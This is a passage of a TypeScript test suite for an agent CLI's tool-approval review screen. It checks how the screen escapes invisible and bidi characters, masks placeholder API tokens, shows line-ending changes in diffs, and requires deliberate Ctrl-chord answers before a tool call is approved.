import type { ToolApprovalRequest, ToolFileDiff, ToolPreview } from '@relavium/core';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import {
  createReviewDocument,
  escapeReviewCharacter,
  projectReviewPage,
  REVIEW_START,
  reviewBytes,
  type ReviewCursor,
  type ReviewDocument,
  type ReviewPage,
} from './tool-review-projection.js';
import {
  acknowledgeToolReview,
  initialToolReview,
  inspectionPending,
  isAffirmativeReviewKey,
  isAlwaysConfirmKey,
  isTypingIntoReview,
  reduceToolReviewKey,
  reviewAnswerKey,
  reviewInspected,
  reviewOffersAlways,
  reviewRequiredTarget,
  toolReviewPage,
  toolReviewTarget,
  type ToolReviewState,
} from './tool-review-model.js';
import { lastPageStart, topCursor, type ScrollView } from './tool-review-scroll.js';
import type { ChatKey } from './chat-input.js';
import { createChatStore } from './chat-store.js';
import {
  CARD_KEY_ROWS,
  CARD_RULE_ROWS,
  CARD_TYPEAHEAD_NOTE,
  CARD_VERB_COLUMNS,
  cardRowBudget,
  cardWarnings,
} from './tool-review-card.js';
import { displayWidth } from './viewport.js';
import { INLINE_TRANSCRIPT_BOUND } from './session-view-model.js';
import { transcriptDocument, wrapTranscript } from './chat-projection.js';
import { editedFilePreview } from './fixtures/edit-diff.js';

function replacement(before: string | null, after: string): ToolPreview {
  const ending = (text: string): 'lf' | 'crlf' | 'none' =>
    text.endsWith('\r\n') ? 'crlf' : text.endsWith('\n') ? 'lf' : 'none';
  const lines: ToolFileDiff['lines'][number][] = [];
  for (const [kind, text] of [
    ['removed', before],
    ['added', after],
  ] as const) {
    if (text === null || text.length === 0) continue;
    const end = ending(text);
    lines.push({
      kind,
      text: text.slice(0, text.length - (end === 'crlf' ? 2 : end === 'lf' ? 1 : 0)),
      ending: end,
      ...(kind === 'removed'
        ? { before: { line: 1, start: 0, end: text.length } }
        : { after: { line: 1, start: 0, end: text.length } }),
    });
  }
  return {
    kind: 'operation',
    target: 'file.txt',
    fields: [],
    diff: {
      before,
      after,
      lines,
      beforeEndings: before === null || before === '' ? 'empty' : ending(before),
      afterEndings: after === '' ? 'empty' : ending(after),
      stats: {
        addedLines: after === '' ? 0 : 1,
        removedLines: before === '' || before === null ? 0 : 1,
        beforeBytes: reviewBytes(before ?? ''),
        afterBytes: reviewBytes(after),
      },
    },
  };
}
/**
 * `total` lines of `line n` with ONE line inserted after line `afterLine`, as the engine's line diff delivers it: the only
 * changed line starts far into its field (an absolute offset), unlike the first line of a new file.
 */
function insertedLinePreview(total: number, afterLine: number, inserted: string): ToolPreview {
  const sides = { before: 0, after: 0 };
  const span = (side: 'before' | 'after', line: number, text: string) => {
    const start = sides[side];
    sides[side] += text.length + 1;
    return { line, start, end: sides[side] };
  };
  const original = Array.from({ length: total }, (_, index) => `line ${index + 1}`);
  const lines: ToolFileDiff['lines'][number][] = [];
  const after: string[] = [];
  original.forEach((text, index) => {
    after.push(text);
    lines.push({
      kind: 'context',
      text,
      ending: 'lf',
      before: span('before', index + 1, text),
      after: span('after', after.length, text),
    });
    if (index + 1 !== afterLine) return;
    after.push(inserted);
    lines.push({
      kind: 'added',
      text: inserted,
      ending: 'lf',
      after: span('after', after.length, inserted),
    });
  });
  const bytes = (rows: readonly string[]): number => reviewBytes(`${rows.join('\n')}\n`);
  return {
    kind: 'operation',
    target: 'src/app.ts',
    fields: [],
    diff: {
      before: `${original.join('\n')}\n`,
      after: `${after.join('\n')}\n`,
      beforeEndings: 'lf',
      afterEndings: 'lf',
      stats: {
        addedLines: 1,
        removedLines: 0,
        beforeBytes: bytes(original),
        afterBytes: bytes(after),
      },
      lines,
    },
  };
}
const page = (preview: ToolPreview, reveal = false) =>
  projectReviewPage(createReviewDocument(preview), REVIEW_START, 78, 20, reveal);
/**
 * Every key that ANSWERS an approval card is a Ctrl chord — Ctrl+Y allow, Ctrl+G session-wide (then Enter), Ctrl+N deny,
 * Ctrl+R deny with a reason. A bare letter answers nothing: while a turn runs the person is often typing the next
 * instruction, and a letter typed at a card that has just appeared is indistinguishable from a deliberate press (PR #99).
 * One place names the chord, so a test says `CTRL` where it means "the answer key" and `{}` where it means "a stray key".
 */
const CTRL = { ctrl: true } as const;

describe('review source projection', () => {
  it.each([
    ['<TAB>', '\t'],
    ['<SP>', ' '],
    ['<U+202E>', '\u202e'],
    ['<U+003C>', '<'],
    ['<LF>', '\n'],
    ['<EOF:NO_NEWLINE>', ''],
    ['<MASK:id=1;bytes=5>', '\u2800'],
    ['·', '\t'],
  ])('keeps literal %j distinguishable from synthetic %j without color', (literal, source) => {
    const left = page({ kind: 'operation', fields: [{ name: 'test', value: literal }] }).rows.join(
      '\n',
    );
    const right = page({ kind: 'operation', fields: [{ name: 'test', value: source }] }).rows.join(
      '\n',
    );
    expect(left).not.toBe(right);
    if (literal.includes('<')) expect(left).toContain('<U+003C>');
  });
  it.each([
    '\u2028',
    '\u2029',
    '\u200b',
    '\ufe0f',
    '\u2800',
    '\u{16fe4}',
    '\u{1d159}',
    '\u{e0049}',
    '\ud800',
    '\u00a0',
    '\r',
    '\u001b',
  ])('makes invisible source %j printable', (char) => {
    expect(escapeReviewCharacter(char, false)).toMatch(/^<U\+[0-9A-F]+>$/u);
  });
  it('preserves exact line endings and the real final-newline-only change on both sides', () => {
    const final = page(replacement('same', 'same\n')).rows.join('\n');
    expect(final).toContain('-1 same<EOF:NO_NEWLINE>');
    expect(final).toContain('+1 same<LF>');
    expect(page(replacement('same\r\n', 'same\n')).rows.join('\n')).toContain('-1 same<CRLF>');
    // Both sides uniformly LF: the ending carries no information, so the ordinary line prints no token
    // (ADR-0129 §4) — yet the trailing whitespace on the removed line is still spelled out.
    const ordinary = page(replacement('x \t\n', 'x·\n')).rows.join('\n');
    expect(ordinary).toContain('-1 x<SP><TAB>');
    expect(ordinary).not.toContain('<LF>');
  });
  it('keeps <EOF:NO_NEWLINE> on the unterminated side of a final-newline-only change in a uniform LF file', () => {
    // What the core diff emits for `a\nb` -> `a\nb\n`: both sides classify as lf (the unterminated last line
    // is ignored), the unchanged first line is context, and only the last line differs by its ending.
    const before = 'a\nb';
    const after = 'a\nb\n';
    const rows = page({
      kind: 'operation',
      target: 'file.txt',
      fields: [],
      diff: {
        before,
        after,
        beforeEndings: 'lf',
        afterEndings: 'lf',
        stats: { addedLines: 1, removedLines: 1, beforeBytes: 3, afterBytes: 4 },
        lines: [
          {
            kind: 'context',
            text: 'a',
            ending: 'lf',
            before: { line: 1, start: 0, end: 2 },
            after: { line: 1, start: 0, end: 2 },
          },
          { kind: 'removed', text: 'b', ending: 'none', before: { line: 2, start: 2, end: 3 } },
          { kind: 'added', text: 'b', ending: 'lf', after: { line: 2, start: 2, end: 4 } },
        ],
      },
    }).rows.join('\n');
    expect(rows).toContain('-2 b<EOF:NO_NEWLINE>');
    expect(rows).toContain('+2 b');
    expect(rows).not.toContain('<LF>');
  });
  it('prints an ending token on a side whose ending differs from the other side, and none when both agree', () => {
    // LF → CRLF: nothing may look unchanged, so both sides spell their ending.
    const converted = page(replacement('a\n', 'a\r\n')).rows.join('\n');
    expect(converted).toContain('-1 a<LF>');
    expect(converted).toContain('+1 a<CRLF>');
    // CRLF replaced by CRLF is uniform on both sides: no token (the card states "CRLF endings" instead).
    expect(page(replacement('a\r\n', 'b\r\n')).rows.join('\n')).not.toContain('<CRLF>');
    // A new LF or CRLF file has an empty other side and is uniform: no per-line token either.
    expect(page(replacement(null, 'a\n')).rows.join('\n')).not.toContain('<LF>');
    expect(page(replacement(null, 'a\r\n')).rows.join('\n')).not.toContain('<CRLF>');
  });
  it('keeps new empty files explicit and never invents an unterminated source line', () => {
    const document = createReviewDocument(replacement(null, ''));
    expect(document.preview.diff?.before).toBeNull();
    expect(document.lines).toHaveLength(1); // declared target only
    expect(projectReviewPage(document, REVIEW_START, 78, 20).rows.join('\n')).not.toContain(
      '<EOF:NO_NEWLINE>',
    );
  });
  it.each(['before', 'after'] as const)(
    'refuses a full-detail %s source exceeding the byte ceiling even when its UTF-16 length fits',
    (side) => {
      const source = '界'.repeat(Math.floor((8 * 1024 * 1024) / 3) + 1);
      expect(source.length).toBeLessThan(8 * 1024 * 1024);
      expect(
        createReviewDocument(
          replacement(side === 'before' ? source : null, side === 'after' ? source : ''),
        ).valid,
      ).toBe(false);
    },
  );
  it('retains original spans and byte lengths, with a whole-field fallback for uncertain normalized masks', () => {
    const value = '😀 Bearer sk-proj-abcdefghijklmnopqrstuvw';
    const document = createReviewDocument({
      kind: 'operation',
      fields: [{ name: 'value', value }],
    });
    const mask = document.masks[0];
    expect(mask).toMatchObject({ start: 10, end: value.length, bytes: 31 });
    expect(
      page({ kind: 'operation', fields: [{ name: 'value', value }] }).rows.join('\n'),
    ).not.toContain('abcdefghijkl');
    const ambiguous = 'sk-proj-abcdef\nghijklmnopqrstuvw';
    const fallback = createReviewDocument({
      kind: 'operation',
      fields: [{ name: 'value', value: ambiguous }],
    }).masks[0];
    expect(fallback).toMatchObject({ start: 0, end: ambiguous.length });
  });
  it('fails closed on source/span disagreement and over-budget fields', () => {
    const preview = replacement('old', 'new');
    if (preview.diff === undefined) throw new Error('missing diff');
    expect(
      createReviewDocument({ ...preview, diff: { ...preview.diff, after: 'wrong' } }).valid,
    ).toBe(false);
    expect(
      createReviewDocument({ kind: 'operation', target: 'x'.repeat(4097), fields: [] }).valid,
    ).toBe(false);
  });
  it('lazily traverses a long line without splitting tokens or dropping original intervals', () => {
    // Numeric view writes only NON-ASCII characters as code points (`é` is `<U+00E9>`, 8 columns), so the long line mixes
    // narrow ASCII with wide tokens: a page boundary can fall next to a token that does not fit, and must not split it.
    const value = 'abé界'.repeat(5_000) + '<\u{e0049} ';
    const document = createReviewDocument(replacement('', value));
    let cursor = REVIEW_START,
      seen = 0,
      pages = 0;
    for (;;) {
      const current = projectReviewPage(document, cursor, 78, 7, true, true);
      expect(current.valid).toBe(true);
      for (const row of current.rows) {
        expect(row.length).toBeLessThanOrEqual(78);
        // Every token is whole: stripping the complete `<…>` tokens leaves no stray delimiter behind.
        expect(row.replace(/<[^<>]*>/gu, '')).not.toMatch(/[<>]/u);
      }
      seen += current.shown
        .filter((range) => range.field === 2)
        .reduce((sum, range) => sum + range.end - range.start, 0);
      pages++;
      if (current.next === undefined) break;
      cursor = current.next;
      expect(pages).toBeLessThan(1000);
    }
    expect(seen).toBe(value.length);
  });
});

// The code-point view (`p`): it writes only NON-ASCII characters as `<U+XXXX>`. Printable ASCII stays readable, and every
// token the plain view already uses (a tab, a trailing space, a control, `<`, an invisible or ambiguous character) is the
// same token in both views, so switching views never makes a safety token disappear.
describe('the code-point view tokenises non-ASCII characters only', () => {
  const plain = (char: string, trailing = false) => escapeReviewCharacter(char, trailing, false);
  const numeric = (char: string, trailing = false) => escapeReviewCharacter(char, trailing, true);
  const CODE_POINT_TOKEN = /^<U\+[0-9A-F]{4,6}>$/u;

  it('leaves printable ASCII as it is, in both views', () => {
    for (let code = 0x20; code < 0x7f; code++) {
      const char = String.fromCharCode(code);
      if (char === '<') continue;
      expect(numeric(char), JSON.stringify(char)).toBe(char);
      expect(plain(char), JSON.stringify(char)).toBe(char);
    }
  });

  it('writes a non-ASCII character as its code point only in the code-point view', () => {
    expect(numeric('é')).toBe('<U+00E9>');
    expect(plain('é')).toBe('é');
    expect(numeric('ÿ'), 'the hex digits are upper case').toBe('<U+00FF>');
    expect(numeric('界')).toBe('<U+754C>');
    expect(numeric('ı')).toBe('<U+0131>');
    expect(plain('界')).toBe('界');
  });

  it('writes a supplementary-plane character with as many hex digits as it needs, upper case', () => {
    expect(numeric('😀')).toBe('<U+1F600>');
    expect(numeric('𠮷')).toBe('<U+20BB7>');
    expect(plain('😀')).toBe('😀');
    for (const char of ['😀', '𠮷', '🧑', '\u{1F1E9}'])
      expect(numeric(char), char).toMatch(CODE_POINT_TOKEN);
  });

  it('writes `<` as a token in both views', () => {
    expect(numeric('<')).toBe('<U+003C>');
    expect(plain('<')).toBe('<U+003C>');
  });

  it('writes a tab as <TAB> and a trailing space as <SP> in both views, and leaves any other space alone', () => {
    for (const trailing of [false, true]) {
      expect(numeric('\t', trailing), `tab, trailing ${trailing}`).toBe('<TAB>');
      expect(plain('\t', trailing), `tab, trailing ${trailing}`).toBe('<TAB>');
    }
    expect(numeric(' ', true)).toBe('<SP>');
    expect(plain(' ', true)).toBe('<SP>');
    expect(numeric(' ', false), 'a space between words').toBe(' ');
    expect(plain(' ', false)).toBe(' ');
  });

  it('writes controls and zero-width or bidi characters as the same token in both views', () => {
    for (const char of [
      '\u0000',
      '\u0007',
      '\b',
      '\n',
      '\r',
      '\u001b',
      '\u007f',
      '\u0085',
      ' ',
      '​',
      String.fromCharCode(0x200e),
      String.fromCharCode(0x202e),
      String.fromCharCode(0x2066),
      '﻿',
      String.fromCharCode(0x2028),
      '⠀',
      '\u{e0049}',
    ]) {
      expect(numeric(char), JSON.stringify(char)).toMatch(CODE_POINT_TOKEN);
      expect(numeric(char), JSON.stringify(char)).toBe(plain(char));
    }
  });

  it('is a strict superset of the plain escaping: whatever the plain view tokenises, the code-point view tokenises the same way', () => {
    const codePoints = [
      ...Array.from({ length: 0x300 }, (_, code) => code),
      0x0e01,
      0x2028,
      0x2029,
      0x2800,
      0x3000,
      0x754c,
      0xd800,
      0xfe0f,
      0xfeff,
      0x16fe4,
      0x1d159,
      0x1f600,
      0x20bb7,
      0xe0049,
    ];
    const broken: string[] = [];
    for (const code of codePoints) {
      const char = String.fromCodePoint(code);
      for (const trailing of [false, true]) {
        const plainToken = plain(char, trailing);
        const numericToken = numeric(char, trailing);
        if (plainToken !== char && numericToken !== plainToken)
          broken.push(
            `U+${code.toString(16)} trailing=${trailing}: ${plainToken} -> ${numericToken}`,
          );
        // And it adds exactly the non-ASCII characters: ASCII never changes, everything above U+007F is a token.
        if (code <= 0x7f && numericToken !== plainToken)
          broken.push(`U+${code.toString(16)} (ASCII) differs between views`);
        if (code > 0x7f && !CODE_POINT_TOKEN.test(numericToken))
          broken.push(`U+${code.toString(16)} (non-ASCII) is not a token: ${numericToken}`);
      }
    }
    expect(broken).toEqual([]);
  });

  describe('through the projection', () => {
    const fieldPage = (value: string, numericView: boolean, reveal = false) =>
      projectReviewPage(
        createReviewDocument({ kind: 'operation', fields: [{ name: 'v', value }] }),
        REVIEW_START,
        78,
        20,
        reveal,
        numericView,
      );
    const valueRow = (value: string, numericView: boolean, reveal = false) =>
      fieldPage(value, numericView, reveal).rows.find((row) => row.startsWith('field value '));

    it('draws ASCII text unchanged and a mixed line token by token', () => {
      const value = 'ab é界😀<x y\t ';
      expect(valueRow(value, true)).toBe(
        'field value ab <U+00E9><U+754C><U+1F600><U+003C>x y<TAB><SP>',
      );
      expect(valueRow(value, false)).toBe('field value ab é界😀<U+003C>x y<TAB><SP>');
      expect(valueRow('plain ASCII text', true)).toBe('field value plain ASCII text');
    });

    it('never splits a wide token at the end of a row, and a page cut falls between tokens', () => {
      const value = 'é'.repeat(200);
      const document = createReviewDocument({ kind: 'operation', fields: [{ name: 'v', value }] });
      let cursor = REVIEW_START;
      let tokens = 0;
      for (let pages = 0; pages < 100; pages++) {
        const page = projectReviewPage(document, cursor, 78, 3, false, true);
        expect(page.valid).toBe(true);
        for (const row of page.rows) {
          expect(displayWidth(row)).toBeLessThanOrEqual(78);
          const body = row.replace(/^[^<]*/u, '');
          expect(body.replace(/<U\+00E9>/gu, ''), row).toBe('');
          tokens += body.length / '<U+00E9>'.length;
        }
        if (page.next === undefined) break;
        cursor = page.next;
      }
      expect(tokens).toBe(200);
    });

    it('draws a trailing space and a tab the same in both views, and a space between words as a space', () => {
      for (const view of [true, false]) {
        expect(valueRow('a b\t', view), `numeric ${view}`).toBe('field value a b<TAB>');
        expect(valueRow('a  ', view), `numeric ${view}`).toBe('field value a<SP><SP>');
      }
    });

    it('gives the masked companion the same tokens as the rows, for text with no mask', () => {
      const value = 'é界😀 <\t x ';
      for (const view of [true, false]) {
        const page = fieldPage(value, view);
        expect(page.maskedRows, `numeric ${view}`).toEqual(page.rows);
      }
    });

    it('gives the masked companion of a numeric page the same tokens next to a mask, and no raw non-ASCII or secret', () => {
      const secret = `sk-proj-${'a'.repeat(24)}`;
      const value = `é ${secret} ı\t `;
      const page = fieldPage(value, true, true);
      // The revealed rows show the secret itself and tokenise the non-ASCII around it …
      expect(page.rows.join('\n')).toContain(secret);
      expect(page.rows.join('\n')).toContain(`field value <U+00E9> ${secret} <U+0131><TAB><SP>`);
      // … and the companion follows the same rule, with the secret masked.
      const companion = page.maskedRows.join('\n');
      expect(companion).toContain('field value <U+00E9> <MASK:');
      expect(companion).toContain(' <U+0131><TAB><SP>');
      expect(companion).not.toMatch(/[éı]/u);
      expect(companion).not.toContain('aaaa');
      // The same text in the plain view tokenises everything but the non-ASCII, exactly as the rows do.
      const plainPage = fieldPage(value, false, true);
      expect(plainPage.maskedRows.join('\n')).toContain('field value é <MASK:');
      expect(plainPage.maskedRows.join('\n')).toContain(' ı<TAB><SP>');
    });
  });
});

describe('review approval state', () => {
  it('requires deliberate reveal AND acknowledged coverage for entirely masked changed lines', () => {
    const document = createReviewDocument(
      replacement(
        'Bearer sk-proj-abcdefghijklmnopqrstuvw',
        'Bearer sk-proj-zyxwvutsrqponmlkjihgfed',
      ),
    );
    let state = initialToolReview('approval', 'id', document);
    expect(reviewInspected(state)).toBe(false);
    const card = projectReviewPage(document, REVIEW_START, 78, 4);
    expect(reduceToolReviewKey(state, 'y', CTRL, true, card, true, 0).kind).toBe('none');
    const full = reduceToolReviewKey(state, 'v', {}, true, card, true, 0);
    if (full.kind !== 'state') throw new Error('expected full view');
    state = full.state;
    const reveal = reduceToolReviewKey(state, 'r', {}, true, page(document.preview), true, 0);
    if (reveal.kind !== 'state') throw new Error('expected reveal');
    state = reveal.state;
    expect(reviewInspected(state)).toBe(false);
    expect(reduceToolReviewKey(state, 'y', CTRL, false, undefined, true, 0).kind).toBe('none');
    state = acknowledgeToolReview(state, projectReviewPage(document, REVIEW_START, 78, 20, true));
    expect(reviewInspected(state)).toBe(true);
    expect(
      reduceToolReviewKey(state, 'y', CTRL, true, page(document.preview, true), true, 0),
    ).toEqual({ kind: 'approve', scope: 'once' });
    // The same inspected state answers nothing to the bare letter: the chord is what makes it an answer.
    expect(
      reduceToolReviewKey(state, 'y', {}, true, page(document.preview, true), true, 0),
    ).toEqual({ kind: 'none' });
  });
  it('never treats navigation, reveal, modified/coalesced input or a hidden frame as affirmative', () => {
    const state = {
      ...initialToolReview('approval', 'id', createReviewDocument(replacement('a', 'b'))),
      screen: 'full' as const,
    };
    for (const input of ['r', 'ry', 'ya', '\ny'])
      expect(reduceToolReviewKey(state, input, {}, true, undefined, true, 0).kind).not.toBe(
        'approve',
      );
    expect(reduceToolReviewKey(state, 'y', CTRL, false, undefined, true, 0).kind).toBe('none');
    expect(reduceToolReviewKey(state, 'a', { meta: true }, true, undefined, true, 0).kind).toBe(
      'none',
    );
    // Ctrl+Alt+Y is not Ctrl+Y: a meta-modified chord answers nothing.
    expect(
      reduceToolReviewKey(state, 'y', { ctrl: true, meta: true }, true, undefined, true, 0).kind,
    ).toBe('none');
    // Not cacheable: Ctrl+G grants nothing, whatever the page.
    expect(reduceToolReviewKey(state, 'g', CTRL, true, undefined, false, 0).kind).toBe('none');
  });
});

describe('[Ctrl+N] is a plain deny that needs no acknowledged frame', () => {
  const approval = () =>
    initialToolReview('approval', 'id', createReviewDocument(replacement('a', 'b')));

  it('denies a card or full view whose frame is not visible, exactly as it does when it is visible', () => {
    for (const state of [approval(), { ...approval(), screen: 'full' as const }]) {
      const visible = reduceToolReviewKey(state, 'n', CTRL, true, undefined, false, 0);
      const hidden = reduceToolReviewKey(state, 'n', CTRL, false, undefined, false, 0);
      expect(visible).toEqual({ kind: 'deny' });
      expect(hidden).toEqual(visible);
    }
  });

  it('is not a bare [n]: a letter typed at the card denies nothing, whether the frame is visible or not', () => {
    for (const state of [approval(), { ...approval(), screen: 'full' as const }])
      for (const visible of [true, false])
        expect(reduceToolReviewKey(state, 'n', {}, visible, undefined, false, 0).kind).toBe('none');
  });

  it('still refuses every other answer and every modified [Ctrl+N] while the frame is not visible', () => {
    const state = approval();
    // Ctrl+Y (allow), Ctrl+G (always) and Ctrl+R (reason) need the visible frame; only the plain deny does not.
    for (const input of ['y', 'g', 'r'])
      expect(reduceToolReviewKey(state, input, CTRL, false, undefined, true, 0).kind, input).toBe(
        'none',
      );
    // The bare letters that used to answer answer nothing at all (visible or not), and neither does a modified Ctrl+N.
    for (const input of ['y', 'a', 'c', 'b', 'r', 'n'])
      expect(reduceToolReviewKey(state, input, {}, false, undefined, true, 0).kind, input).toBe(
        'none',
      );
    for (const key of [{ meta: true }, { ctrl: true, meta: true }])
      expect(reduceToolReviewKey(state, 'n', key, false, undefined, true, 0).kind).toBe('none');
  });

  it('keeps [n] as typed text in a denial reason, a search and a details view, visible or not', () => {
    const typing = { ...approval(), denial: '' };
    expect(reduceToolReviewKey(typing, 'n', {}, false, undefined, false, 0).kind).toBe('none');
    expect(reduceToolReviewKey(typing, 'n', {}, true, undefined, false, 0)).toMatchObject({
      kind: 'state',
      state: { denial: 'n' },
    });
    const searching = { ...approval(), screen: 'full' as const, searching: true, query: '' };
    expect(reduceToolReviewKey(searching, 'n', {}, false, undefined, false, 0).kind).toBe('none');
    const details = initialToolReview('details', 'id', createReviewDocument(replacement('a', 'b')));
    expect(reduceToolReviewKey(details, 'n', {}, false, undefined, false, 0).kind).toBe('none');
    expect(reduceToolReviewKey(details, 'n', {}, true, undefined, false, 0).kind).toBe('none');
  });

  it('does not let a Ctrl+N deny from inside a denial reason, a search or a details view: a chord is not an answer there', () => {
    const typing = { ...approval(), denial: 'because' };
    const searching = { ...approval(), screen: 'full' as const, searching: true, query: 'q' };
    const details = initialToolReview('details', 'id', createReviewDocument(replacement('a', 'b')));
    for (const state of [typing, searching, details])
      for (const visible of [true, false])
        expect(reduceToolReviewKey(state, 'n', CTRL, visible, undefined, false, 0)).toEqual({
          kind: 'none',
        });
  });

  it('resolves the pending approval as a denial — not an abort — when the review is not visible', async () => {
    const store = createChatStore(false, undefined, INLINE_TRANSCRIPT_BOUND);
    const answer = store.requestApproval(
      { toolId: 'write_file', action: 'fs_write', preview: { path: 'file.txt' } },
      true,
      undefined,
      { callId: 'hidden-deny', preview: replacement('a', 'b') },
    );
    store.bindReviewVisibility(() => false);
    expect(store.handleReviewInput('y', CTRL)).toBe('handled');
    expect(store.handleReviewInput('g', CTRL)).toBe('handled');
    expect(store.getSnapshot().approval, 'Ctrl+Y and Ctrl+G answer nothing').toBeDefined();
    // The bare letter that used to deny denies nothing now: a letter typed at a card is typing.
    expect(store.handleReviewInput('n', {})).toBe('handled');
    expect(store.getSnapshot().approval, 'a bare n denies nothing').toBeDefined();
    expect(store.handleReviewInput('n', CTRL)).toBe('handled');
    expect(await answer).toEqual({ outcome: 'reject' });
    expect(store.getSnapshot().approval).toBeUndefined();
  });
});

describe('ephemeral tool display ownership', () => {
  it('orders assistant segments and same-name calls by engine id, while seeds and hatches exclude previews', () => {
    const store = createChatStore(false, undefined, INLINE_TRANSCRIPT_BOUND);
    store.apply({
      type: 'agent:token',
      sessionId: 's',
      sequenceNumber: 1,
      timestamp: '2026-11-12T00:00:00Z',
      nodeId: 'n',
      token: 'First',
      model: 'm',
    });
    store.applyToolLiveEvent({ phase: 'started', callId: 'one', toolId: 'write_file' });
    store.applyToolLiveEvent({
      phase: 'preview',
      callId: 'one',
      toolId: 'write_file',
      preview: replacement('private-before', 'private-after'),
    });
    store.applyToolLiveEvent({
      phase: 'completed',
      callId: 'one',
      toolId: 'write_file',
      outcome: 'denied',
    });
    store.applyToolLiveEvent({ phase: 'started', callId: 'two', toolId: 'write_file' });
    store.applyToolLiveEvent({
      phase: 'completed',
      callId: 'two',
      toolId: 'write_file',
      outcome: 'success',
    });
    const entries = store.getSnapshot().state.transcript;
    expect(entries.map((entry) => entry.role)).toEqual(['assistant', 'tools', 'tools']);
    expect(
      wrapTranscript(entries, 80, false, store.getSnapshot().toolDisplays)
        .map((line) => line.text)
        .join('\n'),
    ).toContain('denied');
    expect(transcriptDocument(entries)).not.toContain('file.txt');
    expect(JSON.stringify(entries)).not.toContain('private-');
    store.sealToolPreviews();
    store.applyToolLiveEvent({
      phase: 'preview',
      callId: 'late',
      toolId: 'write_file',
      preview: replacement('late-private', 'late-after'),
    });
    expect(store.getSnapshot().toolDisplays.size).toBe(0);
    expect(store.getSnapshot().review).toBeUndefined();
  });
});

it.each(['git_status', 'mcp:server:custom'])(
  'opens the retained bounded summary of %s without a declared preview',
  (toolId) => {
    const store = createChatStore(false, undefined, INLINE_TRANSCRIPT_BOUND);
    store.applyToolLiveEvent({ phase: 'started', callId: 'summary', toolId });
    store.applyToolLiveEvent({
      phase: 'completed',
      callId: 'summary',
      toolId,
      outcome: 'failure',
      summary: 'Bearer sk-proj-abcdefghijklmnopqrstuvw',
    });
    store.openDetails();
    store.bindReviewVisibility(() => true);
    store.handleReviewInput('', { return: true });
    const review = store.getSnapshot().review;
    expect(review?.screen).toBe('full');
    expect(review?.callId).toBe('summary');
    expect(review?.document?.preview.target).toBeUndefined();
    expect(review?.document?.preview.diff).toBeUndefined();
    const shown =
      review?.document === undefined
        ? ''
        : projectReviewPage(review.document, REVIEW_START, 78, 20).rows.join('\n');
    expect(shown).toContain('Preview unavailable');
    expect(shown).toContain('Result summary');
    expect(shown).not.toContain('abcdefghijkl');
  },
);

it('keeps the selected details call stable when older calls are evicted', () => {
  const store = createChatStore(false, undefined, INLINE_TRANSCRIPT_BOUND);
  for (let index = 0; index < 64; index++)
    store.applyToolLiveEvent({ phase: 'started', callId: `call-${index}`, toolId: 'git_status' });
  store.openDetails();
  store.bindReviewVisibility(() => true);
  // The list opens on the NEWEST call (ADR-0134 §6): Home goes to the oldest, one Down selects the second-oldest, which is
  // what the eviction of the oldest call must leave selected — as the same call, one place higher.
  expect(store.getSnapshot().review?.selected).toBe(63);
  store.handleReviewInput('', { home: true });
  store.handleReviewInput('', { downArrow: true });
  expect(store.getSnapshot().review?.selected).toBe(1);
  store.applyToolLiveEvent({ phase: 'started', callId: 'new-call', toolId: 'git_status' });
  expect(store.getSnapshot().toolDisplays.has('call-0')).toBe(false);
  expect(store.getSnapshot().review?.selected).toBe(0);
  store.handleReviewInput('', { return: true });
  expect(store.getSnapshot().review?.callId).toBe('call-1');
  store.handleReviewInput('b', {});
  store.handleReviewInput('', { return: true });
  expect(store.getSnapshot().review?.callId).toBe('call-1');
});

it('closes the details list when its selected call is evicted', () => {
  const store = createChatStore(false, undefined, INLINE_TRANSCRIPT_BOUND);
  for (let index = 0; index < 64; index++)
    store.applyToolLiveEvent({ phase: 'started', callId: `call-${index}`, toolId: 'git_status' });
  store.openDetails();
  store.bindReviewVisibility(() => true);
  // The list opens on the newest call; the oldest is what the eviction takes, so select it first (Home).
  store.handleReviewInput('', { home: true });
  expect(store.getSnapshot().review?.selected).toBe(0);
  expect(store.getSnapshot().review?.callId).toBe('call-0');
  store.applyToolLiveEvent({ phase: 'started', callId: 'new-call', toolId: 'git_status' });
  expect(store.getSnapshot().toolDisplays.has('call-0')).toBe(false);
  expect(store.getSnapshot().review).toBeUndefined();
  expect(store.handleReviewInput('', { return: true })).toBeUndefined();
});

it('opens the retained summary after the actual aggregate preview budget evicts a document', () => {
  const store = createChatStore(false, undefined, INLINE_TRANSCRIPT_BOUND);
  // Four-byte source preserves the real byte-budget proof with less code-point indexing work.
  const full = replacement('😀'.repeat(2 * 1024 * 1024), '😎'.repeat(2 * 1024 * 1024));
  store.applyToolLiveEvent({ phase: 'started', callId: 'evicted', toolId: 'write_file' });
  store.applyToolLiveEvent({
    phase: 'preview',
    callId: 'evicted',
    toolId: 'write_file',
    preview: { ...full, target: 'DO_NOT_RECONSTRUCT' },
  });
  store.applyToolLiveEvent({
    phase: 'completed',
    callId: 'evicted',
    toolId: 'write_file',
    outcome: 'success',
    summary: 'Retained result',
  });
  // Two complete 8 MiB before/after snapshots plus targets exceed the real 32 MiB budget.
  store.applyToolLiveEvent({
    phase: 'preview',
    callId: 'newer',
    toolId: 'write_file',
    preview: full,
  });
  expect(store.getSnapshot().toolDisplays.get('evicted')?.document).toBeUndefined();
  store.openDetails();
  store.bindReviewVisibility(() => true);
  // The list opens on the newest call ('newer'); the evicted one is the oldest, so Home selects it.
  expect(store.getSnapshot().review?.callId).toBe('newer');
  store.handleReviewInput('', { home: true });
  expect(store.getSnapshot().review?.callId).toBe('evicted');
  store.handleReviewInput('', { return: true });
  expect(store.getSnapshot().review?.callId).toBe('evicted');
  const preview = store.getSnapshot().review?.document?.preview;
  expect(preview?.target).toBeUndefined();
  expect(preview?.diff).toBeUndefined();
  expect(preview?.fields).toContainEqual({ name: 'Result summary', value: 'Retained result' });
  expect(JSON.stringify(preview)).not.toContain('DO_NOT_RECONSTRUCT');
});

it('copies only the escaped masked page after reveal, and never leaks raw details through transcript hatches', async () => {
  const store = createChatStore(false, undefined, INLINE_TRANSCRIPT_BOUND);
  store.applyToolLiveEvent({ phase: 'started', callId: 'copy', toolId: 'write_file' });
  store.applyToolLiveEvent({
    phase: 'preview',
    callId: 'copy',
    toolId: 'write_file',
    preview: replacement(
      'Bearer sk-proj-abcdefghijklmnopqrstuvw',
      'Bearer sk-proj-zyxwvutsrqponmlkjihgfed',
    ),
  });
  store.applyToolLiveEvent({
    phase: 'completed',
    callId: 'copy',
    toolId: 'write_file',
    outcome: 'success',
    summary: 'Completed',
  });
  store.openDetails();
  store.bindReviewVisibility(() => true);
  store.handleReviewInput('', { return: true });
  store.handleReviewInput('r', {});
  const review = store.getSnapshot().review;
